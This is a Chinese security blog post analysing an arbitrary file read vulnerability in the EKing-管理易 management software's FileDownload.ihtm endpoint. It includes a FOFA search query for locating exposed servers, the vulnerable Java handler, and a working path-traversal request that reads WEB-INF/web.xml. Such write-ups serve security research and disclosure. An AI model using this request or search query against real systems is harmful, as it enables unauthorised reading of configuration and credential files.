---
title: "EKing-管理易 FileDownload.ihtm 任意文件读取漏洞"
source: https://mrxn.net/jswz/eking-FileDownload-handleFileDownload.html
---

# EKing-管理易 FileDownload.ihtm 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/24 18:37
* 766浏览
* [0评论](#comment)
* 57分钟
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

EKing-管理易是一款专为广告制品制作企业量身定制的管理软件产品，由广州易凯软件技术有限公司开发,管理易基于久经考验的JAVA企业版技术研发，汇聚了数百家行业用户的管理精髓，旨在帮助广告装饰、有机工艺、展览展示、有机丝印、喷绘写真等广告标识制作企业实现规范化、科学化管理，提升运营效率，降低运营成本。EKing-管理易系统
`FileDownload.ihtm`
接口存在任意
[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)
漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

# 影响版本

# fofa语法

> `app="EKing-管理易"`

# 漏洞分析

先看 web.xml 当中定义并配置Spring的核心Servlet——DispatcherServlet 部分

```
<context-param>
    <param-name>contextConfigLocation</param-name>
    <param-value>/WEB-INF/applicationContext.xml,/WEB-INF/DAOs.xml,/WEB-INF/Spring-Hibernate.xml,/WEB-INF/Validators.xml,/WEB-INF/Interceptors.xml,/WEB-INF/Services.xml,/WEB-INF/Transactions.xml</param-value>
</context-param>
<servlet>
    <servlet-name>Dispatcher</servlet-name>
    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
    <init-param>
       <param-name>contextConfigLocation</param-name>
       <param-value>/WEB-INF/Url-Mapping.xml,/WEB-INF/Controllers.xml</param-value>
    </init-param>
    <load-on-startup>2</load-on-startup>
</servlet>
<!-- lin end -->

<!-- lin start -->
<servlet-mapping>
    <servlet-name>Dispatcher</servlet-name>
    <url-pattern>*.ihtm</url-pattern>
</servlet-mapping>
```

* `<servlet-class>`
  ：指定Servlet的实现类为
  `org.springframework.web.servlet.DispatcherServlet`
  ，这是Spring MVC的核心组件，负责将请求分发到相应的控制器。
* `<init-param>`
  ：为
  `DispatcherServlet`
  配置初始化参数。
  + `contextConfigLocation`
    ：指定
    `DispatcherServlet`
    的配置文件路径。
  + `param-value`
    ：列出了
    `DispatcherServlet`
    的配置文件，通常包括URL映射和控制器定义。
  + `Url-Mapping.xml`
    ：定义URL与控制器方法的映射。
  + `Controllers.xml`
    ：定义控制器Bean。
* `<servlet-name>`
  ：指定要映射的Servlet名称为
  `Dispatcher`
  。
* `<url-pattern>`
  ：定义URL匹配模式，
  `*.ihtm`
  表示所有以
  `.ihtm`
  结尾的URL请求都由
  `DispatcherServlet`
  处理。
  + 例如，
    `/Main.ihtm`
    、
    `/TopMenu.ihtm`
    等请求都会被
    `DispatcherServlet`
    处理。

再看 Controllers.xml

```
<bean id="commonMACtr" class="com.minierp.controller.CommonMACtr">
    <property name="methodNameResolver">
       <bean
          class="org.springframework.web.servlet.mvc.multiaction.PropertiesMethodNameResolver">
          <property name="mappings">
             <props>
                <prop key="/FileDownload.ihtm">handleFileDownload</prop>
```

* `<bean id="commonMACtr" class="com.minierp.controller.CommonMACtr">`
  ：定义了一个Bean，其ID为
  `commonMACtr`
  ，类为
  `com.minierp.controller.CommonMACtr`
  。这个Bean是一个控制器类，用于处理HTTP请求。
* `<property name="methodNameResolver">`
  ：为
  `commonMACtr`
  Bean设置了一个属性
  `methodNameResolver`
  ，该属性用于解析请求URL并映射到相应的方法。
  + `<bean class="org.springframework.web.servlet.mvc.multiaction.PropertiesMethodNameResolver">`
    ：定义了一个
    `PropertiesMethodNameResolver`
    类型的Bean，用于根据URL路径解析方法名。
  + `<property name="mappings">`
    ：设置了
    `mappings`
    属性，该属性包含了URL路径与方法的映射关系。
    - `<props>`
      ：定义了一组属性（键值对），每个
      `<prop>`
      元素表示一个URL路径与方法的映射。
    - `<prop key="/WW_verify_*.txt">handleWwTxtUrl</prop>`
      ：表示当请求的URL匹配
      `/WW_verify_*.txt`
      时，调用
      `handleWwTxtUrl`
      方法。
    - `<prop key="/RandomImageCode.ihtm">handleRandomImageCode</prop>`
      ：表示当请求的URL匹配
      `/RandomImageCode.ihtm`
      时，调用
      `handleRandomImageCode`
      方法。
    - 其他
      `<prop>`
      元素类似，分别定义了不同URL路径与方法的映射关系。

当访问 FileDownload.ihtm 时，进入 handleFileDownload 处理，业务逻辑如下

```
public ModelAndView handleFileDownload(HttpServletRequest request, HttpServletResponse response) throws Exception {
    String fileName = request.getParameter("file_name");
    String sourceName = request.getParameter("source_name");
    String type = request.getParameter("type");
    UserBean ub = EncCommonHelper.getCurrentUserAccount(request);
    String path = this.getServletContext().getRealPath("/");
    if (!path.endsWith(File.separator)) {
        path = path + File.separator;
    }

    if (ub != null && type != null && type.equals("PRIVATE")) {
        path = path + "priv_download" + File.separator + ub.getUser().getStafferId() + File.separator;
    }

    File file = new File(path + fileName);
    FileInputStream is = null;
    ServletOutputStream out = null;
    if (ub != null && file.exists() && file.isFile()) {
        try {
            if (sourceName == null || sourceName.equals("")) {
                sourceName = file.getName();
            }

            response.setCharacterEncoding("utf-8");
            response.setContentType("APPLICATION/OCTET-STREAM");
            String[] tmpArr = sourceName.split(" ");
            String attaName = "";

            for(int i = 0; i < tmpArr.length; ++i) {
                attaName = attaName + " " + URLEncoder.encode(tmpArr[i], "utf-8");
            }

            response.setHeader("Content-Disposition", "attachment; filename=\"" + attaName + "\"");
            is = new FileInputStream(file);
            out = response.getOutputStream();
            byte[] b = new byte[1024];

            for(int len = is.read(b); len != -1; len = is.read(b)) {
                out.write(b, 0, len);
            }

            out.flush();
        } finally {
            if (is != null) {
                is.close();
            }

            if (out != null) {
                out.close();
            }

        }
    } else {
        String errMsg = "No login or file not exist!";

        try {
            response.setCharacterEncoding("utf-8");
            response.setContentType("text/plain");
            out = response.getOutputStream();
            out.write(errMsg.getBytes());
            out.flush();
        } finally {
            if (out != null) {
                out.close();
            }

        }
    }

    return null;
}
```

接收
`file_name`
参数的值后 直接拼接进路径后，调用
`File file = new File(path + fileName);`
创建文件流读取后直接写入响应body，无任何过滤或校验，造成
[任意文件读取漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
。

# 漏洞复现

```
GET /FileDownload.ihtm?file_name=WEB-INF/web.xml HTTP/1.1
Host: eking.mrxn.net
```

成功读取到 web.xml 内容

![EKing-管理易 FileDownload.ihtm 任意文件读取漏洞](https://image.mrxn.net/68dec2b416274e86b0f4f62bb0123676.webp)

# 参考

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[EKing-管理易 FileDownload.ihtm 任意文件读取漏洞](https://mrxn.net/jswz/eking-FileDownload-handleFileDownload.html)
  
文章链接：
<https://mrxn.net/jswz/eking-FileDownload-handleFileDownload.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eking-FileDownload-handleFileDownload.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eking-FileDownload-handleFileDownload.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});